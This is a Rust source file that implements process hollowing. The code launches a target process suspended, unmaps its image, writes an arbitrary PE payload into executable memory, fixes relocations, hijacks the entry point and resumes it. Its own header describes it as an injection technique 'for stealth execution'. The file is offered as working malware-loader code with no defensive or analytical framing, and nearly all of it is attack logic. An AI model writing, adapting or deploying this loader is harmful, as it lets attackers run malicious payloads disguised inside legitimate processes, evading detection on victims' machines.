//! Process Hollowing Implementation
//! Advanced process injection technique for stealth execution

use alloc::{vec::Vec, string::String};
use core::mem;
use crate::windows_stubs::*;
use crate::pe_loader::{PeLoader, PeError};

pub const CREATE_SUSPENDED: DWORD = 0x00000004;
pub const MEM_COMMIT: DWORD = 0x00001000;
pub const MEM_RESERVE: DWORD = 0x00002000;
pub const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
pub const CONTEXT_FULL: DWORD = 0x10000B;

pub struct ProcessHollower {
    target_process: PROCESS_INFORMATION,
    target_context: CONTEXT,
    payload_data: Vec<u8>,
    original_image_base: u64,
}

impl ProcessHollower {
    pub fn new(payload: Vec<u8>) -> Self {
        Self {
            target_process: unsafe { mem::zeroed() },
            target_context: unsafe { mem::zeroed() },
            payload_data: payload,
            original_image_base: 0,
        }
    }
    
    pub fn hollow_process(&mut self, target_path: &str) -> Result<(), HollowError> {
        // Step 1: Create suspended process
        self.create_suspended_process(target_path)?;
        
        // Step 2: Get thread context
        self.get_thread_context()?;
        
        // Step 3: Read PEB to get image base
        let peb_address = self.read_peb_address()?;
        self.original_image_base = self.read_image_base_from_peb(peb_address)?;
        
        // Step 4: Unmap original executable
        self.unmap_original_executable()?;
        
        // Step 5: Allocate memory for payload
        let payload_base = self.allocate_payload_memory()?;
        
        // Step 6: Write payload to process
        self.write_payload_to_process(payload_base)?;
        
        // Step 7: Fix relocations
        self.fix_payload_relocations(payload_base)?;
        
        // Step 8: Set new entry point
        self.set_entry_point(payload_base)?;
        
        // Step 9: Resume thread
        self.resume_thread()?;
        
        Ok(())
    }
    
    fn create_suspended_process(&mut self, target_path: &str) -> Result<(), HollowError> {
        let mut startup_info: STARTUPINFOW = unsafe { mem::zeroed() };
        startup_info.cb = mem::size_of::<STARTUPINFOW>() as u32;
        
        // Convert path to wide string
        let wide_path = self.string_to_wide(target_path);
        
        let success = unsafe {
            CreateProcessW(
                wide_path.as_ptr(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                FALSE,
                CREATE_SUSPENDED,
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                &mut startup_info,
                &mut self.target_process,
            )
        };
        
        if success == FALSE {
            return Err(HollowError::ProcessCreationFailed);
        }
        
        Ok(())
    }
    
    fn get_thread_context(&mut self) -> Result<(), HollowError> {
        self.target_context.ContextFlags = CONTEXT_FULL;
        
        let success = unsafe {
            GetThreadContext(self.target_process.hThread, &mut self.target_context)
        };
        
        if success == FALSE {
            return Err(HollowError::ContextRetrievalFailed);
        }
        
        Ok(())
    }
    
    fn read_peb_address(&self) -> Result<u64, HollowError> {
        // In x64, PEB address is in RDX register when process starts
        Ok(self.target_context.Rdx)
    }
    
    fn read_image_base_from_peb(&self, peb_address: u64) -> Result<u64, HollowError> {
        let mut image_base: u64 = 0;
        let mut bytes_read: SIZE_T = 0;
        
        // PEB+0x10 contains ImageBaseAddress
        let image_base_offset = peb_address + 0x10;
        
        let success = unsafe {
            ReadProcessMemory(
                self.target_process.hProcess,
                image_base_offset as LPCVOID,
                &mut image_base as *mut _ as LPVOID,
                mem::size_of::<u64>(),
                &mut bytes_read,
            )
        };
        
        if success == FALSE || bytes_read != mem::size_of::<u64>() {
            return Err(HollowError::MemoryReadFailed);
        }
        
        Ok(image_base)
    }
    
    fn unmap_original_executable(&self) -> Result<(), HollowError> {
        let result = unsafe {
            NtUnmapViewOfSection(
                self.target_process.hProcess,
                self.original_image_base as PVOID,
            )
        };
        
        if result != STATUS_SUCCESS {
            // Some processes might fail unmapping, we can continue anyway
        }
        
        Ok(())
    }
    
    fn allocate_payload_memory(&self) -> Result<u64, HollowError> {
        let pe_loader = PeLoader::new(self.payload_data.clone())
            .map_err(|_| HollowError::InvalidPayload)?;
        
        let image_size = if pe_loader.is_64bit().unwrap_or(false) {
            pe_loader.get_optional_header_64()
                .map_err(|_| HollowError::InvalidPayload)?
                .size_of_image
        } else {
            pe_loader.get_optional_header_32()
                .map_err(|_| HollowError::InvalidPayload)?
                .size_of_image
        };
        
        let allocated_base = unsafe {
            VirtualAllocEx(
                self.target_process.hProcess,
                self.original_image_base as LPVOID,
                image_size as SIZE_T,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        
        if allocated_base.is_null() {
            // Try allocating at any address if preferred base fails
            let allocated_base = unsafe {
                VirtualAllocEx(
                    self.target_process.hProcess,
                    core::ptr::null_mut(),
                    image_size as SIZE_T,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                )
            };
            
            if allocated_base.is_null() {
                return Err(HollowError::AllocationFailed);
            }
            
            Ok(allocated_base as u64)
        } else {
            Ok(allocated_base as u64)
        }
    }
    
    fn write_payload_to_process(&self, base_address: u64) -> Result<(), HollowError> {
        let mut pe_loader = PeLoader::new(self.payload_data.clone())
            .map_err(|_| HollowError::InvalidPayload)?;
        
        // Get headers size
        let headers_size = if pe_loader.is_64bit().unwrap_or(false) {
            pe_loader.get_optional_header_64()
                .map_err(|_| HollowError::InvalidPayload)?
                .size_of_headers
        } else {
            pe_loader.get_optional_header_32()
                .map_err(|_| HollowError::InvalidPayload)?
                .size_of_headers
        };
        
        // Write headers
        let mut bytes_written: SIZE_T = 0;
        let success = unsafe {
            WriteProcessMemory(
                self.target_process.hProcess,
                base_address as LPVOID,
                self.payload_data.as_ptr() as LPCVOID,
                headers_size as SIZE_T,
                &mut bytes_written,
            )
        };
        
        if success == FALSE {
            return Err(HollowError::MemoryWriteFailed);
        }
        
        // Write sections
        let sections = pe_loader.get_sections()
            .map_err(|_| HollowError::InvalidPayload)?;
        
        for section in sections {
            if section.size_of_raw_data == 0 {
                continue;
            }
            
            let section_data = &self.payload_data[section.pointer_to_raw_data as usize..
                (section.pointer_to_raw_data + section.size_of_raw_data) as usize];
            
            let section_va = base_address + section.virtual_address as u64;
            
            let success = unsafe {
                WriteProcessMemory(
                    self.target_process.hProcess,
                    section_va as LPVOID,
                    section_data.as_ptr() as LPCVOID,
                    section.size_of_raw_data as SIZE_T,
                    &mut bytes_written,
                )
            };
            
            if success == FALSE {
                return Err(HollowError::MemoryWriteFailed);
            }
        }
        
        Ok(())
    }
    
    fn fix_payload_relocations(&self, new_base: u64) -> Result<(), HollowError> {
        let pe_loader = PeLoader::new(self.payload_data.clone())
            .map_err(|_| HollowError::InvalidPayload)?;
        
        let (original_base, reloc_dir) = if pe_loader.is_64bit().unwrap_or(false) {
            let header = pe_loader.get_optional_header_64()
                .map_err(|_| HollowError::InvalidPayload)?;
            (header.image_base, header.data_directory[5]) // IMAGE_DIRECTORY_ENTRY_BASERELOC
        } else {
            let header = pe_loader.get_optional_header_32()
                .map_err(|_| HollowError::InvalidPayload)?;
            (header.image_base as u64, header.data_directory[5])
        };
        
        if reloc_dir.size == 0 {
            return Ok(()); // No relocations needed
        }
        
        let delta = new_base as i64 - original_base as i64;
        if delta == 0 {
            return Ok(()); // No adjustment needed
        }
        
        // Process relocations in target process memory
        self.process_remote_relocations(new_base, reloc_dir.virtual_address, reloc_dir.size, delta)?;
        
        Ok(())
    }
    
    fn process_remote_relocations(
        &self,
        base: u64,
        reloc_rva: u32,
        reloc_size: u32,
        delta: i64,
    ) -> Result<(), HollowError> {
        let mut offset = 0u32;
        
        while offset < reloc_size {
            // Read relocation block header
            let mut block_header: [u8; 8] = [0; 8];
            let mut bytes_read: SIZE_T = 0;
            
            unsafe {
                ReadProcessMemory(
                    self.target_process.hProcess,
                    (base + reloc_rva as u64 + offset as u64) as LPCVOID,
                    block_header.as_mut_ptr() as LPVOID,
                    8,
                    &mut bytes_read,
                );
            }
            
            let block_va = u32::from_le_bytes([block_header[0], block_header[1], block_header[2], block_header[3]]);
            let block_size = u32::from_le_bytes([block_header[4], block_header[5], block_header[6], block_header[7]]);
            
            if block_size == 0 {
                break;
            }
            
            let entries = (block_size - 8) / 2;
            
            for i in 0..entries {
                let mut entry_bytes: [u8; 2] = [0; 2];
                
                unsafe {
                    ReadProcessMemory(
                        self.target_process.hProcess,
                        (base + reloc_rva as u64 + offset as u64 + 8 + i as u64 * 2) as LPCVOID,
                        entry_bytes.as_mut_ptr() as LPVOID,
                        2,
                        &mut bytes_read,
                    );
                }
                
                let entry = u16::from_le_bytes(entry_bytes);
                let reloc_type = (entry >> 12) & 0xF;
                let reloc_offset = entry & 0xFFF;
                
                let target_va = base + block_va as u64 + reloc_offset as u64;
                
                match reloc_type {
                    3 => { // IMAGE_REL_BASED_HIGHLOW
                        let mut value: u32 = 0;
                        unsafe {
                            ReadProcessMemory(
                                self.target_process.hProcess,
                                target_va as LPCVOID,
                                &mut value as *mut _ as LPVOID,
                                4,
                                &mut bytes_read,
                            );
                            
                            value = (value as i32 + delta as i32) as u32;
                            
                            WriteProcessMemory(
                                self.target_process.hProcess,
                                target_va as LPVOID,
                                &value as *const _ as LPCVOID,
                                4,
                                &mut bytes_read,
                            );
                        }
                    }
                    10 => { // IMAGE_REL_BASED_DIR64
                        let mut value: u64 = 0;
                        unsafe {
                            ReadProcessMemory(
                                self.target_process.hProcess,
                                target_va as LPCVOID,
                                &mut value as *mut _ as LPVOID,
                                8,
                                &mut bytes_read,
                            );
                            
                            value = (value as i64 + delta) as u64;
                            
                            WriteProcessMemory(
                                self.target_process.hProcess,
                                target_va as LPVOID,
                                &value as *const _ as LPCVOID,
                                8,
                                &mut bytes_read,
                            );
                        }
                    }
                    _ => {}
                }
            }
            
            offset += block_size;
        }
        
        Ok(())
    }
    
    fn set_entry_point(&mut self, base_address: u64) -> Result<(), HollowError> {
        let pe_loader = PeLoader::new(self.payload_data.clone())
            .map_err(|_| HollowError::InvalidPayload)?;
        
        let entry_point_rva = if pe_loader.is_64bit().unwrap_or(false) {
            pe_loader.get_optional_header_64()
                .map_err(|_| HollowError::InvalidPayload)?
                .address_of_entry_point
        } else {
            pe_loader.get_optional_header_32()
                .map_err(|_| HollowError::InvalidPayload)?
                .address_of_entry_point
        };
        
        // Update RCX register with new entry point
        self.target_context.Rcx = base_address + entry_point_rva as u64;
        
        // Write updated PEB with new image base
        let peb_address = self.target_context.Rdx;
        let image_base_offset = peb_address + 0x10;
        let mut bytes_written: SIZE_T = 0;
        
        unsafe {
            WriteProcessMemory(
                self.target_process.hProcess,
                image_base_offset as LPVOID,
                &base_address as *const _ as LPCVOID,
                8,
                &mut bytes_written,
            );
        }
        
        // Set thread context
        let success = unsafe {
            SetThreadContext(self.target_process.hThread, &self.target_context)
        };
        
        if success == FALSE {
            return Err(HollowError::ContextUpdateFailed);
        }
        
        Ok(())
    }
    
    fn resume_thread(&self) -> Result<(), HollowError> {
        let result = unsafe {
            ResumeThread(self.target_process.hThread)
        };
        
        if result == -1i32 as u32 {
            return Err(HollowError::ThreadResumeFailed);
        }
        
        Ok(())
    }
    
    fn string_to_wide(&self, s: &str) -> Vec<u16> {
        let mut wide: Vec<u16> = s.encode_utf16().collect();
        wide.push(0);
        wide
    }
}

// Windows API function declarations (would be linked from kernel32.dll/ntdll.dll)
extern "system" {
    fn CreateProcessW(
        application_name: LPCWSTR,
        command_line: LPWSTR,
        process_attributes: *mut c_void,
        thread_attributes: *mut c_void,
        inherit_handles: BOOL,
        creation_flags: DWORD,
        environment: LPVOID,
        current_directory: LPCWSTR,
        startup_info: *mut STARTUPINFOW,
        process_information: *mut PROCESS_INFORMATION,
    ) -> BOOL;
    
    fn GetThreadContext(thread: HANDLE, context: *mut CONTEXT) -> BOOL;
    fn SetThreadContext(thread: HANDLE, context: *const CONTEXT) -> BOOL;
    fn ResumeThread(thread: HANDLE) -> DWORD;
    fn SuspendThread(thread: HANDLE) -> DWORD;
    
    fn ReadProcessMemory(
        process: HANDLE,
        base_address: LPCVOID,
        buffer: LPVOID,
        size: SIZE_T,
        bytes_read: *mut SIZE_T,
    ) -> BOOL;
    
    fn WriteProcessMemory(
        process: HANDLE,
        base_address: LPVOID,
        buffer: LPCVOID,
        size: SIZE_T,
        bytes_written: *mut SIZE_T,
    ) -> BOOL;
    
    fn VirtualAllocEx(
        process: HANDLE,
        address: LPVOID,
        size: SIZE_T,
        allocation_type: DWORD,
        protect: DWORD,
    ) -> LPVOID;
    
    fn VirtualFreeEx(
        process: HANDLE,
        address: LPVOID,
        size: SIZE_T,
        free_type: DWORD,
    ) -> BOOL;
    
    fn VirtualProtectEx(
        process: HANDLE,
        address: LPVOID,
        size: SIZE_T,
        new_protect: DWORD,
        old_protect: *mut DWORD,
    ) -> BOOL;
    
    fn NtUnmapViewOfSection(process: HANDLE, base_address: PVOID) -> NTSTATUS;
    fn NtQueryInformationProcess(
        process: HANDLE,
        process_information_class: u32,
        process_information: PVOID,
        process_information_length: ULONG,
        return_length: PULONG,
    ) -> NTSTATUS;
}

#[derive(Debug)]
pub enum HollowError {
    ProcessCreationFailed,
    ContextRetrievalFailed,
    ContextUpdateFailed,
    MemoryReadFailed,
    MemoryWriteFailed,
    AllocationFailed,
    InvalidPayload,
    ThreadResumeFailed,
}

impl core::fmt::Display for HollowError {
    fn fmt(&self, f: &mut core::fmt::Formatter) -> core::fmt::Result {
        match self {
            HollowError::ProcessCreationFailed => write!(f, "Failed to create target process"),
            HollowError::ContextRetrievalFailed => write!(f, "Failed to get thread context"),
            HollowError::ContextUpdateFailed => write!(f, "Failed to update thread context"),
            HollowError::MemoryReadFailed => write!(f, "Failed to read process memory"),
            HollowError::MemoryWriteFailed => write!(f, "Failed to write process memory"),
            HollowError::AllocationFailed => write!(f, "Failed to allocate memory"),
            HollowError::InvalidPayload => write!(f, "Invalid PE payload"),
            HollowError::ThreadResumeFailed => write!(f, "Failed to resume thread"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_context_size() {
        assert!(mem::size_of::<CONTEXT>() > 0);
    }
    
    #[test]
    fn test_process_info_size() {
        assert_eq!(mem::size_of::<PROCESS_INFORMATION>(), 24);
    }
}